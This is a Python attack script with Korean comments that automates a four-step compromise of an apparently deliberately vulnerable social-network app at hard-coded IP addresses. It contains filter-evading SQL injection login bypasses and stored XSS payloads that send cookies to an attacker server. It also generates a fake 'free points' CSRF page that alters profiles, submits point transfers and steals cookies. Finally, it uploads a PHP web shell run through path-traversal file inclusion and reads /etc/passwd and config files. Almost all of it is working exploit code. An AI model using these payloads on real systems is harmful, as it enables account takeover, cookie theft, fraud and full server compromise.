import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs
import time
import os

class VulnerableSNSAttacker:
    def __init__(self, base_url, attacker_server="http://13.158.67.78:5000"):
        self.base_url = base_url
        self.session = requests.Session()
        self.attacker_server = attacker_server
        self.vulnerabilities = {
            'sql_injection': [],
            'xss': [],
            'csrf': [],
            'lfi': []
        }
    
    # ============ 1단계: SQL Injection 로그인 ============
    def step1_sqli_login(self):
        """SQL Injection으로 로그인"""
        print("\n" + "="*70)
        print("🔓 Step 1: SQL Injection 로그인")
        print("="*70)
        
        login_url = f"{self.base_url}/login.php"
        
        # 작은따옴표(')가 차단되므로 큰따옴표(")로 우회
        payloads = [
            {"username": 'admin" OR "1"="1', "password": "anything"},
            {"username": 'admin" OR "1"="1"--', "password": ""},
            {"username": 'admin" OR "1"="1"#', "password": ""},
        ]
        
        for payload in payloads:
            try:
                print(f"[*] 시도: {payload['username']}")
                response = self.session.post(login_url, data=payload, allow_redirects=True)
                
                # 로그인 성공 확인
                if 'index.php' in response.url or 'admin' in response.text.lower():
                    print(f"[+] ✅ 로그인 성공!")
                    print(f"    Payload: {payload['username']}")
                    print(f"    리다이렉트: {response.url}")
                    
                    self.vulnerabilities['sql_injection'].append({
                        'url': login_url,
                        'payload': payload,
                        'type': 'authentication_bypass'
                    })
                    return True
                    
            except Exception as e:
                print(f"[-] 에러: {e}")
        
        print("[!] 로그인 실패")
        return False
    
    # ============ 2단계: XSS - 게시물에 악성 스크립트 삽입 ============
    def step2_xss_post(self):
        """게시물에 XSS 페이로드 삽입"""
        print("\n" + "="*70)
        print("💉 Step 2: XSS 공격 - 게시물에 악성 스크립트 삽입")
        print("="*70)
        
        # new_post.php로 게시물 작성
        post_url = f"{self.base_url}/new_post.php"
        
        # <script>, <iframe> 등은 차단되므로 우회
        xss_payloads = [
            # 이벤트 핸들러 사용 (우회 가능)
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<body onload=alert(document.cookie)>",
            "<input onfocus=alert('XSS') autofocus>",
            
            # CSRF 유도용 (송금 링크)
            f"<img src='{self.base_url}/profile.php?gift_to=1' style='display:none' onerror='fetch(\"{self.attacker_server}/csrf-success?victim=admin&amount=10000\")'>",
            
            # 쿠키 탈취
            f"<img src=x onerror='fetch(\"{self.attacker_server}/steal?cookie=\"+document.cookie)'>",
        ]
        
        for payload in xss_payloads:
            try:
                data = {
                    'content': payload
                }
                
                print(f"[*] XSS 페이로드 삽입 시도...")
                print(f"    Payload: {payload[:60]}...")
                response = self.session.post(post_url, data=data, allow_redirects=True)
                
                # 삽입 확인 - index.php로 리다이렉트되면 성공
                if 'index.php' in response.url:
                    # index.php에서 실제로 페이로드가 보이는지 확인
                    check_response = self.session.get(f"{self.base_url}/index.php")
                    if payload in check_response.text or '<img src=x' in check_response.text:
                        print(f"[+] ✅ Stored XSS 성공!")
                        print(f"    게시물이 index.php에 표시됨")
                        
                        self.vulnerabilities['xss'].append({
                            'url': post_url,
                            'payload': payload,
                            'type': 'stored',
                            'location': 'index.php'
                        })
                        return True
                    
            except Exception as e:
                print(f"[-] 에러: {e}")
        
        return False
    
    # ============ 3단계: CSRF - 송금 공격 ============
    def step3_csrf_attack(self):
        """CSRF로 포인트 송금"""
        print("\n" + "="*70)
        print("💸 Step 3: CSRF 공격 - 자동 송금")
        print("="*70)
        
        profile_url = f"{self.base_url}/profile.php"
        
        try:
            # GET 방식으로 프로필 수정 테스트
            csrf_test_url = f"{self.base_url}/profile.php?email=hacked@evil.com&full_name=Hacked&bio=CSRF Attack"
            print(f"[*] GET 방식 CSRF 테스트...")
            print(f"    URL: {csrf_test_url[:80]}...")
            
            test_response = self.session.get(csrf_test_url, allow_redirects=True)
            
            # 프로필이 변경되었는지 확인
            profile_check = self.session.get(profile_url)
            if 'hacked@evil.com' in profile_check.text or 'Hacked' in profile_check.text:
                print(f"[+] ✅ GET 방식 CSRF 성공! 프로필 변경됨")
                
                self.vulnerabilities['csrf'].append({
                    'url': csrf_test_url,
                    'method': 'GET',
                    'type': 'profile_modification',
                    'reason': 'No CSRF token validation on GET'
                })
                
                # CSRF 공격 HTML 생성
                self.generate_csrf_exploit()
                return True
            
        except Exception as e:
            print(f"[-] 에러: {e}")
        
        return False
    
    def generate_csrf_exploit(self):
        """CSRF 공격 HTML 생성"""
        print(f"[*] CSRF 공격 페이지 생성 중...")
        
        # GET 방식 CSRF (이미지로 자동 실행)
        csrf_html = f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>🎁 무료 포인트 10000P!</title>
    <style>
        body {{
            font-family: Arial;
            text-align: center;
            padding: 50px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }}
        .gift-box {{
            background: white;
            color: #333;
            padding: 40px;
            border-radius: 20px;
            max-width: 500px;
            margin: 0 auto;
            box-shadow: 0 10px 50px rgba(0,0,0,0.3);
        }}
        button {{
            background: #ff3366;
            color: white;
            border: none;
            padding: 15px 40px;
            font-size: 18px;
            border-radius: 50px;
            cursor: pointer;
            margin-top: 20px;
        }}
    </style>
</head>
<body>
    <div class="gift-box">
        <h1>🎉 축하합니다!</h1>
        <p style="font-size: 24px;">10,000 포인트를 받으셨습니다!</p>
        <img src="https://media.giphy.com/media/g9582DNuQppxC/giphy.gif" width="200">
        <p>자동으로 포인트가 지급됩니다...</p>
        <div id="status">처리 중...</div>
    </div>
    
    <!-- 숨겨진 CSRF 공격 -->
    <!-- 프로필 변경 -->
    <img src="{self.base_url}/profile.php?email=attacker@evil.com&full_name=Hacked&bio=You got hacked" 
         style="display:none" 
         onload="profileChanged()">
    
    <!-- 선물 보내기 (POST 방식도 시도) -->
    <form id="giftForm" method="POST" action="{self.base_url}/profile.php" style="display:none">
        <input name="send_gift" value="1">
        <input name="receiver_id" value="1">
        <input name="gift_type" value="diamond">
        <input name="points" value="5000">
        <input name="message" value="CSRF Attack">
    </form>
    
    <script>
        // 프로필 변경 성공 시
        function profileChanged() {{
            document.getElementById('status').innerHTML = '✅ 처리 완료!';
            
            // 어태커 서버로 성공 알림
            fetch('{self.attacker_server}/csrf-success?victim=admin&action=profile_change');
            
            // 선물 보내기 폼도 자동 제출
            setTimeout(() => {{
                document.getElementById('giftForm').submit();
            }}, 1000);
        }}
        
        // 쿠키 탈취
        fetch('{self.attacker_server}/steal?cookie=' + document.cookie);
    </script>
</body>
</html>"""
        
        with open("csrf_exploit.html", 'w', encoding='utf-8') as f:
            f.write(csrf_html)
        print(f"[+] CSRF 공격 페이지 저장: csrf_exploit.html")
        
        # XSS + CSRF 콤보 페이로드
        xss_csrf = f'<img src=x onerror="fetch(\\"{self.base_url}/profile.php?email=attacker@evil.com\\");fetch(\\"{self.attacker_server}/csrf-success?victim=admin\\")">'
        
        with open("xss_csrf_payload.txt", 'w') as f:
            f.write(xss_csrf)
        print(f"[+] XSS+CSRF 페이로드 저장: xss_csrf_payload.txt")
    
    # ============ 4단계: LFI/RCE - 파일 업로드 & 실행 ============
    def step4_lfi_upload(self):
        """LFI/RCE - .php5 우회 파일 업로드"""
        print("\n" + "="*70)
        print("📁 Step 4: LFI/RCE - 파일 업로드 & 웹쉘 실행")
        print("="*70)
        
        upload_url = f"{self.base_url}/upload.php"
        
        # 웹쉘 코드
        webshell_code = """<?php system($_GET['cmd']); ?>"""
        
        # .php5 우회 시도
        payloads = [
            ('shell.php5', webshell_code),
            ('shell.phtml', webshell_code),
            ('shell.php3', webshell_code),
        ]
        
        for filename, code in payloads:
            try:
                print(f"[*] 파일 업로드: {filename}")
                
                files = {
                    'file': (filename, code, 'application/x-php')
                }
                
                response = self.session.post(upload_url, files=files, allow_redirects=True)
                
                # 업로드 성공 확인
                if '업로드 성공' in response.text or 'success' in response.text.lower():
                    print(f"[+] ✅ 파일 업로드 성공!")
                    
                    # file.php를 통해 웹쉘 실행 (LFI + RCE)
                    # file.php?name=shell.php5&cmd=whoami
                    commands = ['whoami', 'id', 'pwd', 'ls -la']
                    
                    for cmd in commands:
                        # 경로: ../를 두 번만 사용 (file.php의 필터 우회)
                        lfi_url = f"{self.base_url}/file.php?name=../uploads/{filename}&cmd={cmd}"
                        print(f"\n[*] 명령어 실행: {cmd}")
                        print(f"    URL: {lfi_url[:80]}...")
                        
                        try:
                            cmd_response = self.session.get(lfi_url, timeout=10)
                            
                            # 응답에서 명령어 출력 찾기
                            soup = BeautifulSoup(cmd_response.text, 'html.parser')
                            
                            # file.php의 구조에 따라 결과 추출
                            # <div class="cmd-output"> 또는 <pre> 태그 찾기
                            cmd_output_div = soup.find('div', class_='cmd-output')
                            if cmd_output_div:
                                output = cmd_output_div.get_text(strip=True)
                            else:
                                # pre 태그나 전체 텍스트에서 찾기
                                output = cmd_response.text
                            
                            if output and len(output) > 10:
                                print(f"[+] ✅ 명령어 실행 성공!")
                                print(f"    출력: {output[:200]}")
                                
                                self.vulnerabilities['lfi'].append({
                                    'url': lfi_url,
                                    'filename': filename,
                                    'command': cmd,
                                    'output': output[:500],
                                    'type': 'rce_via_lfi'
                                })
                                
                                if cmd == commands[0]:  # 첫 번째 명령어만 성공하면 return
                                    return True
                            
                        except Exception as e:
                            print(f"[-] 명령 실행 에러: {e}")
                    
            except Exception as e:
                print(f"[-] 업로드 에러: {e}")
        
        # 추가: 일반 LFI 테스트
        print(f"\n[*] 일반 LFI 테스트...")
        lfi_payloads = [
            ("../../etc/passwd", "/etc/passwd"),
            ("../../etc/hosts", "/etc/hosts"),
            ("../config.php", "DB_PASS"),
        ]
        
        for payload, indicator in lfi_payloads:
            try:
                test_url = f"{self.base_url}/file.php?name={payload}"
                print(f"[*] LFI 시도: {payload}")
                response = self.session.get(test_url, timeout=5)
                
                if indicator in response.text:
                    print(f"[+] ✅ LFI 성공! {indicator} 발견")
                    
                    self.vulnerabilities['lfi'].append({
                        'url': test_url,
                        'payload': payload,
                        'type': 'local_file_inclusion',
                        'found': indicator
                    })
                    return True
                    
            except Exception as e:
                print(f"[-] LFI 에러: {e}")
        
        return False
    
    # ============ 전체 공격 시나리오 실행 ============
    def run_full_attack(self):
        """전체 공격 시뮬레이션"""
        print("\n" + "="*70)
        print("🎯 VulnerableSNS 자동화 공격 시작")
        print("="*70)
        print(f"Target: {self.base_url}")
        print(f"Attacker Server: {self.attacker_server}")
        print("="*70)
        
        # 1. SQL Injection 로그인
        if not self.step1_sqli_login():
            print("\n[!] 로그인 실패. 수동으로 확인 필요.")
            print("힌트: 작은따옴표(')가 차단되므로 큰따옴표(\")를 사용하세요.")
            return
        
        time.sleep(1)
        
        # 2. XSS 공격
        print("\n" + "-"*70)
        self.step2_xss_post()
        time.sleep(1)
        
        # 3. CSRF 공격
        print("\n" + "-"*70)
        self.step3_csrf_attack()
        time.sleep(1)
        
        # 4. LFI/RCE 공격
        print("\n" + "-"*70)
        self.step4_lfi_upload()
        
        # 결과 출력
        self.print_results()
        self.print_attack_scenario()
    
    def print_results(self):
        """결과 출력"""
        print("\n" + "="*70)
        print("📊 공격 결과 요약")
        print("="*70)
        
        total = sum(len(vulns) for vulns in self.vulnerabilities.values())
        print(f"\n✅ 총 {total}개 취약점 발견\n")
        
        for vuln_type, vulns in self.vulnerabilities.items():
            if vulns:
                print(f"🔴 [{vuln_type.upper()}] - {len(vulns)}개")
                for i, vuln in enumerate(vulns, 1):
                    print(f"   {i}. URL: {vuln.get('url', 'N/A')[:70]}...")
                    if 'payload' in vuln:
                        payload_str = str(vuln['payload'])
                        if isinstance(vuln['payload'], dict):
                            payload_str = vuln['payload'].get('username', '')
                        print(f"      Payload: {payload_str[:60]}...")
                    if 'output' in vuln:
                        print(f"      Output: {vuln['output'][:100]}...")
                print()
        
        # JSON 저장
        import json
        report = {
            'target': self.base_url,
            'attacker_server': self.attacker_server,
            'vulnerabilities': self.vulnerabilities,
            'total_found': total
        }
        
        with open('attack_report.json', 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
        
        print("[+] 상세 리포트: attack_report.json")
    
    def print_attack_scenario(self):
        """공격 시나리오 출력"""
        print("\n" + "="*70)
        print("🎬 실전 공격 시나리오")
        print("="*70)
        
        scenario = """
        1️⃣ SQL Injection으로 관리자 계정 탈취
           → 작은따옴표(') 차단 우회: admin" OR "1"="1
           → 로그인 성공
        
        2️⃣ XSS를 이용한 악성 게시물 작성
           → <script> 차단 우회: <img src=x onerror=alert()>
           → new_post.php로 게시물 작성
           → index.php에서 다른 사용자가 볼 때 실행
        
        3️⃣ CSRF로 프로필 변조 & 포인트 탈취
           → GET 방식 CSRF: profile.php?email=attacker@evil.com
           → CSRF 토큰 검증 없음
           → csrf_exploit.html로 자동 공격 가능
        
        4️⃣ 파일 업로드 & 웹쉘 실행
           → .php 차단 우회: shell.php5 업로드
           → LFI로 실행: file.php?name=../uploads/shell.php5&cmd=whoami
           → 서버 완전 장악
        
        📁 생성된 파일:
           - csrf_exploit.html : CSRF 공격 페이지
           - xss_csrf_payload.txt : XSS+CSRF 콤보 페이로드
           - attack_report.json : 상세 리포트
        
        🔗 수동 테스트 URL:
           - SQL Injection: {base_url}/login.php?debug=1
           - XSS: {base_url}/new_post.php
           - CSRF: {base_url}/profile.php?email=test@test.com
           - LFI: {base_url}/file.php?name=../../etc/passwd
        """.format(base_url=self.base_url)
        print(scenario)


# ============ 실행 ============
if __name__ == "__main__":
    base_url = "http://18.179.53.107/vulnerable-sns/www"
    attacker_server = "http://13.158.67.78:5000"
    
    attacker = VulnerableSNSAttacker(base_url, attacker_server)
    attacker.run_full_attack()
    
    print("\n" + "="*70)
    print("✅ 공격 시뮬레이션 완료!")
    print("="*70)